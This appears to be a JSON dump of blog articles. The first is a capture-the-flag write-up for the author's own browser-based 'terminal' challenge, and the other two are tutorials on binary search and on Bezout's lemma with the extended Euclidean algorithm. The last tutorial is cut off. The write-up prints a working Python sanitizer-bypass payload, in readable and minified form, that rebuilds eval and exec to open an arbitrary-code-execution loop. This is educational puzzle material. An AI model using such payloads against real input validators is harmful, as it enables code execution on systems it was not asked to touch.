[{"type": "article", "coming_soon": false, "mod_timestamp": 1717862400.0, "mod_date_time": "08 Jun 2024", "cr_timestamp": 1717862400.0, "cr_date_time": "08 Jun 2024", "tags": [{"name": "python-golf", "colour": "gray"}], "title": "Terminal Challenge", "content": "A writeup for the hangman challenge on my homepage. As far as I know it\\'s a completely original challenge; if anything I\\'m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = \\'\\' < \\'_\\' # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I\\'ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. \\'Erroryo\\' U,R,N = \\'urn\\' \\'amedoesn\\' T,S = \\'ts\\' \\'eemtob\\' EVAL = eval STR = EVAL(S+T+R) I,D = \\'id\\' DIR = EVAL(D+I+R) \\'IllcallyouMrUn\\' ONE = \\'\\'<\\'_\\' SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(\\'__import__(\"\\'+BUILTINS+\\'\")\\')) \\'ant\\' EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+\\'(\"\u6877\u6c69\u2065\u7254\u6575\u203a\u7865\u6365\u6928\u706e\u7475\u2928\u3b29\",\"\\'+U+STR(SEVEN+SEVEN+ONE+ONE)+\\'\")[\\'+STR(ONE+ONE)+\\':]\\' EVAL(EXEC+\\'(\\'+SHELLCODE+\\')\\') And the minified version: \\'Erroryo\\';________,_____,_________=\\'urn\\';\\'amedoesn\\';__________,______=\\'ts\\';\\'eemtob\\';___=eval;____,___________=\\'id\\';\\'IllcallyouMrUn\\';_=\\'\\'<\\'_\\';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(\\'__import__(\"\\'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+\\'\")\\')))[-__*__-_-_]+\\'(\\'+____________[-__*__-__-__-_-_]+\\'(\"\u6877\u6c69\u2065\u7254\u6575\u203a\u7865\u6365\u6928\u706e\u7475\u2928\u3b29\",\"\\'+________+_______(__+__+_+_)+\\'\")[\\'+_______(_+_)+\\':]\\'+\\')\\');\\'ant\\' FAQs How did you get Python to run in the browser??? I talked to my comp-sci teacher who helps run this educational tool - and he told me about how they use Pyodide and a web worker. So I implemented that. This is all client-side, so shouldn\\'t I be able to cheese the flag by just looking in F12? Indeed there used to be a cheese solution by just going into F12 and realising that init.py contained the flag (thanks @xp3dx) - but I moved it >:) I have no idea if the flag is still accessible like this because I don\\'t know enough about Next.js, but I will tell you that in my Next.js app it\\'s in components/challenge.js - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...", "id": -2340632918618087415, "dir": ["cyber-writeups"], "is_book_member": false, "name": "terminal"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690483800.0, "mod_date_time": "27 Jul 2023", "cr_timestamp": 1690483800.0, "cr_date_time": "27 Jul 2023", "tags": [{"name": "coding", "colour": "blue"}], "title": "Binary Search: an Intuitive Algorithm", "content": "Everyone has performed a binary search without realizing: if you look for the word \"gerontology\" in the dictionary, you wouldn\\'t go flip through every page until you found it. Instead you\\'d check the middle, and if you overshot then you\\'d check the middle of the first chunk, then if you if undershot you\\'d check the middle of the remaining chunk, and so on, until you find the word. In programmer terms, we can use binary search to search for an item in a sorted array. We keep track of a left pointer and a right poiner. Then we check the middle index by (left + right) / 2 (rounding down). For example, if we were wanted to find the index of 8 in the array [1, 2, 5, 7, 8, 9, 10], we\\'d start by setting the left and right pointer to index 0 and index 6 respectively. [1, 2, 5, 7, 8, 9, 10] ^ ^ ^ left=0 mid=3 right=6 Then, since the item we\\'re looking for (8) is larger than the item at the middle, we know that it has to lie to the right of the middle pointer, thus we can update the left pointer to be mid+1. [1, 2, 5, 7, 8, 9, 10] ^ ^ l=4 r=6 Now the middle pointer is at index 5, and points to 9. This is more than 8, so we can update the right pointer to be mid-1: [1, 2, 5, 7, 8, 9, 10] ^ l=r=4 Now the left and right pointer point to the same thing, so we\\'ve found the index of 8: it\\'s 4. Well actually, we need one more check that the item that\\'s being pointed to is actually 8 - for example, if it was 7.5 instead, we\\'d still end up with left = right = 4. The time complexity of binary search is $O(\\\\log n)$ , because each comparison halves the search space, so it takes a logarithmic number of operations (and $\\\\log_2(n) = \\\\frac{\\\\log n}{\\\\log 2}$). Pseudocode I like to define the left pointer as the one you know it\\'s definitely greater than or equal to, and the right pointer as the one you know it\\'s definitely less than. So, $l \\\\leq x \\\\lt r$. function search(arr, length, target) l := 0 r := n-1 while l+1 < r do m := floor((l+r) / 2) if arr[m] > target then r := m else if arr[m] < target then l := m+1 else return m end end end Example problem: Minimum excludant Given a sorted array of distinct positive integers, find the smallest positive integer that is not in the array. Examples Input: [1, 2, 3, 5, 9, 12, 13] Output: 4 Input: [3, 5, 7, 10] Output: 1 Input: [1, 2, 3, 4] Output: 5 Solution Considering the smallest missing element from the array, we must have that the items before it are the positive integers in order, with no gaps. So the smallest missing element is the smallest element whose value is not equal to its index (indexing from 1). We can use binary search to find this. #!/usr/bin/python3 def solve(array): l = 0 r = len(array) while l != r: m = (l+r) // 2 if array[m] != m+1: r = m else: l = m+1 return l+1 Harder problem: Ntarsis\\' Set View problem on codeforces Ntarsis has been given a set $S$, initially containing the integers $1, 2, 3 \\\\cdots, 10^{1000}$ in sorted order. Every day, he removes the $a_1$-th, $a_2$-th, $\\\\cdots$, $a_n$-th smallest numbers in $S$ simultaneously. What is the smallest element in $S$ after $k$ days? Input The first line contains the number of testcases $t \\\\;(1 \\\\leq t \\\\leq 10^5)$. The description of the testcases follows. The first line of each testcase consists of two integers $n$ and $k$ ($1 \\\\leq n, k \\\\leq 2 \\\\cdot 10^5$) - the length of $a$ and the number of days. The following line of each testcase consists of $n$ integers $a_1, a_2, \\\\cdots, a_n$ ($1 \\\\leq a_i \\\\leq 10^9$) - the elements of array $a$. It is guaranteed that: the sum of $n$ over all testcases does not exceed $2 \\\\cdot 10^5$ the sum of $k$ over all testcases does not exceed $2 \\\\cdot 10^5$ $a_1 \\\\lt a_2 \\\\lt \\\\cdots \\\\lt a_n$ for all testcases. Output For each testcase, print an integer that is the smallest element in $S$ after $k$ days. Example Input: 7 5 1 1 2 4 5 6 5 3 1 3 5 6 7 4 1000 2 3 4 5 9 1434 1 4 7 9 12 15 17 18 20 10 4 1 3 5 7 9 11 13 15 17 19 10 6 1 4 7 10 13 16 19 22 25 28 10 150000 1 3 4 5 10 11 12 13 14 15 Output: 3 9 1 12874 16 18 1499986 Solution Let\\'s simulate backwards instead of forwards. Instead of deleting the positions $a_1, a_2, \\\\cdots, a_n$ each time then checking the first number after $k$ operations, let\\'s start with the number $1$ at the front and insert zeroes at positions $a_1 - 1, a_2 - 2, \\\\cdots, a_n - n$ so that the zeroes will occupy positions $a_1, a_2, \\\\cdots, a_n$ after insertion. After $k$ insertions, we check what position $1$ is in. If the current position of $1$ is $x$, then we need to find how many of $a_1, a_2, \\\\cdots, a_n$ (note this is a nondecreasing sequence) are less than or equal to $x$. We can do this by binary searching on $a_1, a_2, \\\\cdots, a_n$ to find the rightmost occurence of the largest number less than or equal to $x$. The index of that item is how many items will be inserted before the 1; thus we add it to $x$ to get the new position of the 1. If $a_1 \\\\neq 1$, then the answer is 1. Otherwise, we start with $x=0$ and perform the process described above $k$ times. The time complexity is $O(n + k \\\\log n)$. C++ solution: #include <bits/stdc++.h> #define ll long long using namespace std; int n, k, a[200010]; void solve() { cin >> n >> k; for(int i=0; i<n; ++i) { cin >> a[i]; a[i] -= i+1; } if(a[0] != 0) { cout << \"1\\\\n\"; return; } ll x = 0; for(int i=0; i<k; ++i) { int l=0, r=n; int m; while(r-l>1) { m = (l+r)/2; if(a[m] > x) r=m; else l=m; } x += (ll)(l+1); } cout << x+1 << \\'\\\\n\\'; } int main() { ios::sync_with_stdio(0); cin.tie(nullptr); int t; cin >> t; while(t--) solve(); }", "id": 2285589991548768777, "dir": ["comp-sci"], "is_book_member": false, "name": "binary-search"}, {"type": "article", "coming_soon": false, "mod_timestamp": 1690387200.0, "mod_date_time": "26 Jul 2023", "cr_timestamp": 1690387200.0, "cr_date_time": "26 Jul 2023", "tags": [{"name": "number-theory", "colour": "pink"}, {"name": "numerical", "colour": "blue"}], "title": "Bezout's Lemma and the Extended Euclidean Algorithm: Linear Combinations", "content": "tl;dr: A journey from the ground up in which we use axioms to build a proof that every positive integer can be uniquely prime factored. This is part 3, where we discover and prove Bezout\\'s lemma using the division algorithm. In general, the level of rigor will decrease as the parts go on, so that the reader doesn\\'t get bored to death. But it should be obvious how to fill out everything with complete rigor. Here is a glossary of math symbols. Puzzle: water-jug problem You might have heard this one before: There are two water jugs A and B, of size 8 and 5 litres respectively. They have no markings, so it is impossible to tell how much water is in a jug unless it is completely full or completely empty. There is a sink with a water tap and a drain. How can exactly one litre of water be obtained from the tap using the two jugs? It\\'s a fun puzzle - definitely worth playing around with it before reading the solution below. Let $(a,b)$ denote that there are $a$ litres in jug A, and $b$ litres in jug B. $(0,0)$ -> $(8,0)$ -> $(3,5)$ -> $(3,0)$ -> $(0,3)$ -> $(8,3)$ -> $(6,5)$ -> $(6,0)$ -> $(1,5)$ -> $(1,0)$ Now it\\'s time for every mathematician\\'s favourite question: can we generalize it? We start in the state $(0,0)$ and want to end in the state $(1,0)$ (goal state). Notice how one jug must always be empty or full, due to the rules of the question (\"it is impossible to tell how much water is in a jug unless it is completely full or empty\"). Therefore we can deduce that in a valid solution that uses as few operations as possible, the total amount of water only changes by 5 or 8. This is because: transferring water from one jug to another does not change the total amount filling an empty jug will change the total amount by 5 or 8. filling a non-empty but non-full jug is pointless, because the other jug must be empty or full, thus we would obtain the state of both jugs full, or one jug full and one empty, which is backwards progress because those states can be easily reached from $(0,0)$ in 1 or 2 moves. filling a full jug does nothing So now, we have traction on the problem: the total amount of water is initially 0, finally 1, and only changes by 5 or 8. In the general case of the jug capacities being $a$ and $b$, the total must start at 0, end at 1, and change by $a$ or $b$ at each step. Therefore, if we can solve the problem then we must be able to write 1 as a linear combination of $a$ and $b$, i.e. we must be able to find integers $x,y$ such that $ax + by = 1$, because multiplication is repeated addition. In the case of 5 and 8, we can write $1 = 8 \\\\cdot 2 - 5 \\\\cdot 3$, i.e. $1 = 8 + 8 - 5 - 5 - 5$. And so, we\\'ve motivated the main question: Given integers $a,b$, do there exist integers $x,y$ such that $ax+by=1$? If there do not, then the puzzle can\\'t be solved. Numerical Evidence The first thing we might note is that, $ax+by$ will always by divisible by $gcd(a,b)$, no matter what integers $x$ and $y$ we choose (see Lemma 5 in part 1). For example if $a$ is even (divisible by 2) and $b$ is even, then $ax$ and $by$ will both be even, so $ax+by$ will be even. Therefore, if we want $ax+by$ to equal 1, we need $gcd(a,b)$ to be 1, i.e. $a$ and $b$ share no common factors (are \"coprime\"). Now what if they are coprime, say, a=5 and b=8? The key is to write 8 = 5+3. Then a linear combination as 8 and 5 can be rewritten as a linear combination of 3 and 5, and vice versa. Because $8\\\\cdot x + 5 \\\\cdot y$ $= (3 + 5) \\\\cdot x + 5 \\\\cdot y$ $= 3 \\\\cdot x + 5 \\\\cdot (x+y)$. Similarly, a linear combination of 3 and 5 can be transformed into a combination of 3 and 2, which can be transformed into a combination of 1 and 2. But we can always write 1 as a linear combination of 1 and 2, i.e. $1 = 1\\\\cdot 1 + 2\\\\cdot 0$. So theoretically, we should be able to \"undo\" our sequence of transformations to get back to the combination of 5 and 8! Let\\'s try: $$1 = 1\\\\cdot 1 + 2\\\\cdot 0$$ $$ = (3-2)\\\\cdot 1 + 2\\\\cdot 0$$ $$ = 3\\\\cdot 1 + 2\\\\cdot (0-1)$$ $$ = 3\\\\cdot 1 + (5-3)\\\\cdot (-1)$$ $$ = 3\\\\cdot (1+1) + 5\\\\cdot (-1)$$ $$ = (8-5)\\\\cdot 2 + 5\\\\cdot (-1)$$ $$ = 8\\\\cdot 2 + 5\\\\cdot (-1-2)$$ $$ = 8\\\\cdot 2 - 5\\\\cdot 3$$ Which is a linear combination of 5 and 8! Now what about $a=155$ and $b=27$? Let\\'s do the same thing. Note that a linear combination of 155 and 27 is a linear combination of (27*5 + 20) and 27, which is a linear combination of 20 and 27 because $155x + 27y$ $ = (27\\\\cdot 5 + 20)x + 27y$ $= 27(5x+y) + 20x$. And so on, this is a linear combination of 7 and 20, which is a combination of 7 and 6 (because 20 divided by 7 has remainder 6), which is a combination of 7-6=1 and 6. We\\'ve hit 1, so we can start building up the desired combination by going backwards. $$1 = 1\\\\cdot 1 + 6\\\\cdot 0$$ $$ = (7-6)\\\\cdot 1 + 6\\\\cdot 0$$ $$ = 7\\\\cdot 1 + 6\\\\cdot (0-1)$$ $$ = 7\\\\cdot 1 + (20-2\\\\cdot 7)\\\\cdot (-1)$$ $$ = 7\\\\cdot (1+2\\\\cdot 1) + 20\\\\cdot (-1)$$ $$ = (27-20)\\\\cdot 3 + 20\\\\cdot (-1)$$ $$ = 27\\\\cdot 3 + 20\\\\cdot (-1-3)$$ $$ = 27\\\\cdot 3 + (155-5\\\\cdot 27)\\\\cdot (-4)$$ $$ = 27\\\\cdot (3+5\\\\cdot 4) + (155\\\\cdot (-4)$$ $$ = 27\\\\cdot 23 - 155\\\\cdot 4$$ Are you starting to get the idea? Let\\'s do one more example (I also strongly recommend trying some on your own). This time, we\\'ll write out the divisions that we\\'re doing at the start, as well as the reconstruction steps. $a = 259, b = 443$ First, our division steps that \"reduce\" the problem: $$443 = 259 \\\\cdot 1 + 184 \\\\text{, new pair is (259,184)}$$ $$259 = 184 \\\\cdot 1 + 75 \\\\text{, new pair is (184,75)}$$ $$184 = 75 \\\\cdot 2 + 34 \\\\text{, new pair is (75,34)}$$ $$75 = 34 \\\\cdot 2 + 7 \\\\text{, new pair is (34,7)}$$ $$34 = 7 \\\\cdot 4 + 6 \\\\text{, new pair is (7,6)}$$ $$7 = 6 \\\\cdot 1 + 1 \\\\text{, new pair is (6,1)}$$ $$6 = 1 \\\\cdot 6 + 0 \\\\text{, new pair is (1,0)}$$ We stop once we hit (1,0). Now, $1 = 1\\\\cdot 1 - 0\\\\cdot 0$ so we can start reconstructing, by travelling back up the list of divisions. $$1 = 1\\\\cdot 1 - 0 \\\\cdot 0$$ $$ = 1\\\\cdot 1 - (6 - 1\\\\cdot 6) \\\\cdot 0 \\\\text{ (see last line of the division list)}$$ $$ = 1\\\\cdot (1+6\\\\cdot 0) - 6 \\\\cdot 0$$ $$ = (7-6 \\\\cdot 1)\\\\cdot 1 - 6 \\\\cdot 0 \\\\text{ (see penultimate line)}$$ $$ = 7\\\\cdot 1 - 6 \\\\cdot (0+1\\\\cdot 1)$$ $$ = 7\\\\cdot 1 - (34 - 7 \\\\cdot 4) \\\\cdot 1 \\\\text{ (see... etc)}$$ $$ = 7\\\\cdot (1+4\\\\cdot 1) - 34 \\\\cdot 1$$ $$ = (75 - 34\\\\cdot 2)\\\\cdot 5 - 34 \\\\cdot 1$$ $$ = 75\\\\cdot 5 - 34 \\\\cdot (1+2\\\\cdot 5)$$ $$ = 75\\\\cdot 5 - (184 - 75 \\\\cdot 2) \\\\cdot 11$$ $$ = 75\\\\cdot (5 + 2\\\\cdot 11) - 184 \\\\cdot 11$$ $$ = (259-184\\\\cdot 1)\\\\cdot 27 - 184 \\\\cdot 11$$ $$ = 259\\\\cdot 27 - 184 \\\\cdot (11 + 1\\\\cdot 27)$$ $$ = 259\\\\cdot 27 - (443 - 259 \\\\cdot 1) \\\\cdot 38$$ $$ = 259\\\\cdot (27 + 1\\\\cdot 38) - 443 \\\\cdot 38$$ $$ = 259\\\\cdot 65 - 443 \\\\cdot 38$$ which is a solution. Note that I kept the sign in the middle to be negative, which looks like it made all the coefficients positive. By the way, this repeated division process (not including the reconstructing) is called Euclid\\'s Algorithm, and is used to find the gcd of two numbers efficiently. In our case we were finding the gcd of 259 and 443, which is 1, so we ended up with (1,0). Feel free to experiment with what would happen if we had $gcd(a,b) \\\\gt 1$. If we include the reconstructing, then the process of finding a solution to $ax+by=1$ is called the extended Euclidean algorithm (egcd). There are different ways to construct the solution, one of which is exactly as we\\'ve done here. (Feel free to try and generalize what we\\'ve been doing). As long as the initial repeated division (Euclid\\'s algorithm) ends with the pair (1,0), we can perform the reconstruction to find a solution to $ax + by = 1$. In general, Euclid\\'s algorithm ends with the pair being $(gcd(a,b),0)$, so if we do the reconstruction process, we will be able to find a solution to $ax + by = gcd(a,b)$. Bezout\\'s Lemma: Proof Let\\'s switch to our axiom world for a second, to formalize the lemma and prove it. For any two positive integers $a,b$, there exist integers $x,y$ such that $ax + by = gcd(a,b)$. Given that we want to use the well-ordering principle as a proof technique (since it\\'s one of our axioms), we could try to consider the set of all possible $ax+by$ (a,b fixed, x,y vary) and take the smallest one, $e$. Then, if $e \\\\neq gcd(a,b)$ we somehow want to generate an element of the set that is smaller than $e$, so that we can show a contradiction. Let\\'s think about this on the number line. Suppose $a,b$ coprime for simplicity; then we want to show that there is a solution to $ax+by = 1$. If we start at 0 and are allowed to jump left or right by $a$ or $b$, can we get to 1? Well, if we can\\'t, i.e. if the smallest positive number we could reach was $e$ where $e\\\\gt 1$, then we can essentially think of \"going from 0 to e\" as one operation. Then we can go from 0 to e, e to 2e, 2e to 3e, etc., until we get close to $a$ on the number line. By the division algorithm, we can always land in the region between $a,a+e-1$ inclusive. But then we can travel left by a, and we will be in the region between $0, e-1$ inclusive, which is a contradiction because we\\'d be able to reach a smaller number than $e$. Let $a,b \\\\in \\\\mathbb{N}$. Consider the set $$S = \\\\{n \\\\in \\\\mathbb{N} \\\\mid n = ax + by,\\\\; x,y \\\\in \\\\mathbb{Z}\\\\}$$ This set is nonempty (since, for example, $a \\\\in S$) and a subset of the naturals by construction. Thus by the well-ordering principle, S has a least element, say $e = ax_0 + by_0$. $e \\\\mid a$. By the Divison Algorithm, write $a = qe + r$ with $q \\\\in \\\\mathbb{Z}$ and $0 \\\\leq r \\\\lt e$. Then $r = a - q(ax_0 + by_0)$ is a linear combination of $a$ and $b$. But $0 \\\\leq r \\\\lt e$, thus either $r=0$, or $r \\\\in S$ with $r \\\\lt e$. Since the second option contradicts the minimality of $e$, we must have $r=0$, and so $a = qe + 0$ i.e. $e \\\\mid a$. Now by the claim, $e \\\\mid a$. Similarly, repeating the above argument analogously for $b$, we have $e \\\\mid b$. Thus $e$ is a common divisor of $a$ and $b$, so $e \\\\leq gcd(a,b)$ by definition of \"greatest\". But also, recall that $e = ax_0 + by_0$. Since the gcd of a and b divides the RHS by Lemma 4 of the lemma list from part 1, we have that $gcd(a,b) \\\\mid e$, and so $e \\\\geq gcd(a,b)$ by Lemma 19. Overall, since $e \\\\leq gcd(a,b)$ and $e \\\\geq gcd(a,b)$, we have $e = gcd(a,b)$. So $gcd(a,b) = e = ax_0 + by_0$, so $gcd(a,b)$ can be written as a linear combination of $a$ and $b$. Done. Magic box Let\\'s try another concrete example: finding a solution to $29x + 11y = 1$. We could do what we did before, which was the Euclidean Algorithm and then building a solution in reverse. But what if we try the same thing but going forwards? $$29x + 11y = 1$$ $$(2\\\\cdot 11 + 7)x + 11y = 1$$ $$7x + 11(2x+y) = 1$$ $$7x + (7\\\\cdot 1+4)(2x+y) = 1$$ $$7(3x+y) + 4(2x+y) = 1$$ $$(4+3)(3x+y) + 4(2x+y) = 1$$ $$3(3x+y) + 4(5x+2y) = 1$$ $$3(3x+y) + (3+1)(5x+2y) = 1$$ $$3(8x+3y) + 1(5x+2y) = 1$$ $$(3\\\\cdot 1 + 0)(8x+3y) + 1(5x+2y) = 1$$ $$0(8x+3y) + 1(29x + 11y) = 1$$ Uh, oh, it looks like we started with $29x + 11y = 1$ and ended up with $0 + 1(29x+11y) = 1$. Did we go in a circle? It certainly looks like it, apart from one thing - why did we get $(8x+3y)$ in that bracket? Surely there\\'s something special about it. Recall that, when we built up the solution in reverse, we started with \"$0\\\\cdot0 + 1\\\\cdot 1 = 1$\" then built it up. So here, looking at the last line of the above, why don\\'t we set $8x + 3y = 0$? This is easy to find a solution to, e.g. $x=-3, y=8$. What is $29x+11y$ when $x=3$ and $y=-8$? It\\'s one!! So could it be that the significance of $(8x+3y)$ is that it gives a solution? In fact, it looks like something even better is true: for convenience, I\\'ll write a compressed version of what we did again: $$29x + 11y = 1$$ $$7x + 11(2x+y) = 1$$ $$7(3x+y) + 4(2x+y) = 1$$ $$3(3x+y) + 4(5x+2y) = 1$$ $$3(8x+3y) + 1(5x+2y) = 1$$ $$0(8x+3y) + 1(29x + 11y) = 1$$ Look at the coefficients of $x$ and $y$ in the last line: it fits the pattern that $11\\\\cdot 8 - 29\\\\cdot 3 = 1$ Look at the coefficients in the penultimate line: it fits the pattern that $2\\\\cdot 8 - 5\\\\cdot 3 = 1$ Look at the coefficients in the third-to-last line: it fits the pattern that $3\\\\cdot 2 - 5\\\\cdot 1 = 1$ Etc.: it\\'s true for all the lines! If we look at these brackets, and list them out in order: $(0x+1y)$, $(1x+0y)$, $(2x+y)$, $(3x+y)$, $(5x+2y)$, $(8x+3y)$, $(29x+11y)$ Let\\'s stop writing the x and y, and put these in a table instead, where each column represents a bracket: 0 1 2 3 5 8 29 1 0 1 1 2 3 11 Then, arranged like this, the determinant of each 2x2 square alternates between 1 and -1. Now, let\\'s think about how we generated these brackets. Let\\'s say we have written the line $m(ax+by) + n(cx+dy)$ , with $m \\\\gt n$. For example, if $m=3$, $a=8$, $b=3$, $n=1$, $c=5$, $d=2$ then we have the penultimate line of the above. So what\\'s the next line? Well, we reduce: write $m = qn + m\\'$, so $q$ is the next quotient in the Euclidean algorithm, and $m\\'$ is the remainder. $$m(ax + by) + n(cx + dy)$$ $$ = (qn+m\\')(ax + by) + n(cx + dy)$$ $$ = m\\'(ax + by) + n(q(ax+by)+(cx + dy))$$ $$ = m\\'(ax + by) + n((qa+c)x+(qb+d)y)$$ And so, if we have the two brackets $(cx+dy)$ and $(ax+by)$, then the next bracket is $((qa+c)x + (qb+d)y)$. Writing this in the table form, if we currently have two adjacent columns like this: ... $c$ $a$ ... $d$ $b$ Then the next column is like this: ... $c$ $a$ $qa+c$ ... $d$ $b$ $qb+d$ And so, if we put the quotients in a row on top: $q_0$ ... $q_{i-2}$ $q_{i-1}$ $q_i$ ... $0$ $1$ $q_0\\\\cdot 1 + 0$ ... $c$ $a$ $q_ia+c$ ... $1$ $0$ $q_0 \\\\cdot 0 + 1$ ... $d$ $b$ $q_ib+d$ ... Now we have an efficient, convenient way to compute solutions! It\\'s almost... magic! So magic, it\\'s called the magic box! Let\\'s do a couple of examples. First, let\\'s summarize how we found a solution to $29x + 11y = 1$: We first do Euclid\\'s Algorithm to find the quotients: $29 =$ $2$ $\\\\cdot 11 + 7$ $11 =$ $1$ $\\\\cdot 7 + 4$ $7 =$ $1$ $\\\\cdot 4 + 3$ $4 =$ $1$ $\\\\cdot 3 + 1$ $3 =$ $3$ $\\\\cdot 1 + 0$ And so the quotients are $[2, 1, 1, 1, 3]$. Then we draw out the start of the magic box: $2$ $1$ $1$ $1$ $3$ $0$ $1$ $1$ $0$ Now we fill out each row from left to right: each number is equal to the quotient above it in the top row, multiplied by the number to the left of it, plus the number two squares to the left of it. $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2\\\\cdot1 + 0 = 2$ $1$ $0$ $2\\\\cdot 0 + 1 = 1$ $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $1\\\\cdot 2 + 1 = 3$ $1$ $0$ $1$ $1 \\\\cdot 1 + 0 = 1$ $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $3$ $1\\\\cdot 3 + 2 = 5$ $1$ $0$ $1$ $1$ $1 \\\\cdot 1 + 1 = 2$ ... etc... $2$ $1$ $1$ $1$ $3$ $0$ $1$ $2$ $3$ $5$ $8$ $29$ $1$ $0$ $1$ $1$ $2$ $3$ $11$ The last 2x2 square gives us a solution to $29x - 11y = 1$, namely $x = 3$, $y=8$. Now try it yourself! Compute the magic box for $121x + 43y = 1$, and hence find an integer solution. Check against the answer below. $2$ $1$ $4$ $2$ $1$ $2$ $0$ $1$ $2$ $3$ $14$ $31$ $45$ $121$ $1$ $0$ $1$ $1$ $5$ $11$ $16$ $43$ The determinant of the last 2x2 box is $\\\\pm 1$, and we can figure out which one by counting the number of columns (since the determinant of each 2x2 box alternates between 1 and -1). There are 6 columns (excluding the first 2) and so the determinant flips 6 times. It starts at $0\\\\cdot0 = 1\\\\cdot1 = -1$ and so the determinant of the last 2x2 box is $-1$. Hence $45 \\\\cdot 43 - 121 \\\\cdot 16 = -1$, so $121 \\\\cdot 16 + 43 \\\\cdot (-45) = 1$. We\\'ve found our solution, namely $x = 16$, $y = -45$. The magic box also relates to continued fractions: we actually computed the convergents of $121/43$, i.e. (best possible) rational approximations using smaller integers. Really, the \"magic\" of it is that it feels inside-out: originally we were using the quotients in reverse order, but now, we\\'re using them in the same order that we compute them. I won\\'t prove that the magic box works, because this article is quite long already. But feel free to try yourself (hint: induction). Finally, it will feel satisfying to actually write the magic box in terms of 2x2 matrices, since we\\'re talking about determinants: Let\\'s say the list of quotients is $t_1, t_2, \\\\cdots, t_n$ . Then we build a sequence of matrices (which are the 2x2 squares in the magic box, from left to right): the first is $M_1 = \\\\begin{pmatrix}0 & 1\\\\\\\\\\\\\\\\1 & 0\\\\end{pmatrix}$, and for any matrix $M_i$ in the sequence with $M_i = \\\\begin{pmatrix} p_i & p_{i+1} \\\\\\\\\\\\\\\\ q_i & q_{i+1} \\\\end{pmatrix}$, we have that: $$M_{i+1} = \\\\begin{pmatrix} p_{i+1} & t_i p_{i+1} + p_i \\\\\\\\\\\\\\\\ q_{i+1} & t_i q_{i+1} + q_i\\\\end{pmatrix}$$ Now we can write this in terms of $M_i$ like so: $$M_{i+1} = \\\\begin{pmatrix} p_{i+1} & p_i \\\\\\\\\\\\\\\\ q_{i+1} & q_i\\\\end{pmatrix} + \\\\begin{pmatrix} 0 & t_i p_{i+1} \\\\\\\\\\\\\\\\ 0 & t_i q_{i+1}\\\\end{pmatrix}$$ $$= M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & 0 \\\\end{pmatrix} + M_i\\\\begin{pmatrix} 0 & 0 \\\\\\\\\\\\\\\\ 0 & t_i \\\\end{pmatrix}$$ $$= M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_i \\\\end{pmatrix}$$ Now, using this recurrence, we have that the last 2x2 square in the magic box, the one that gives the solution to $ax + by = \\\\pm 1$, is: $$\\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & 0\\\\end{pmatrix} \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_1\\\\end{pmatrix} \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_2\\\\end{pmatrix} (\\\\cdots) \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_n\\\\end{pmatrix}$$ $$ = \\\\prod_{0 \\\\leq i \\\\leq n} \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_i\\\\end{pmatrix}$$ Where we extend the definition of the $t_i$ to include $t_0 = 0$. Note: this recurrence also justifies that the determinant of each 2x2 square in the magic box alternates between 1 and -1, because: $$det(M_{i+1})$$ $$= det\\\\left(M_i \\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_i \\\\end{pmatrix}\\\\right)$$ $$= det(M_i) \\\\, det\\\\left(\\\\begin{pmatrix} 0 & 1 \\\\\\\\\\\\\\\\ 1 & t_i \\\\end{pmatrix}\\\\right)$$ $$ = -det(M_i)$$ Remarks: first unobvious result? Bezout\\'s lemma is interesting because it is the first thing we\\'ve come across that wouldn\\'t be obvious to an average high-school student. Indeed, most people would say, \"why so much rigor?\" when we\\'re proving things like the division algorithm that just already feel obvious to everyone. But that\\'s what a lot of maths is about - ensuring we have rigorous foundations to stand on. In this case, we are all convinced that what we are trying to prove is true, and it does indeed turn out to be provably true, but what about when we\\'re trying to prove something we believe, and it\\'s not true? We need to ensure that all proofs are rigorous (enough), otherwise holes could creep in, and one false assumption would render mathematics ostensibly inconsistent. There are technically two goal states: $(0,1)$ and $(1,0)$, but if we reach one of these then we can reach the other by transferring the water, so it doesn\\'t really matter.\u21a9 This assumption is important, because it lets us deduce that we never fill a non-empty but non-full jug (as that would create unnecessary steps).\u21a9 This is the contrapositive statement of \"if the puzzle can be solved, then there do exist integers...\".\u21a9 Why?\u21a9 Why does the repeated division process end up finding the gcd? Isn\\'t that magical? Hint: $gcd(a,b) = gcd(a-b,b)$ because something divides both $a$ and $b$ if and only if it divides both $a-b$ and $b$.\u21a9 This would be quite inconvenient for a computer algorithm, because we use the quotients in the opposite order 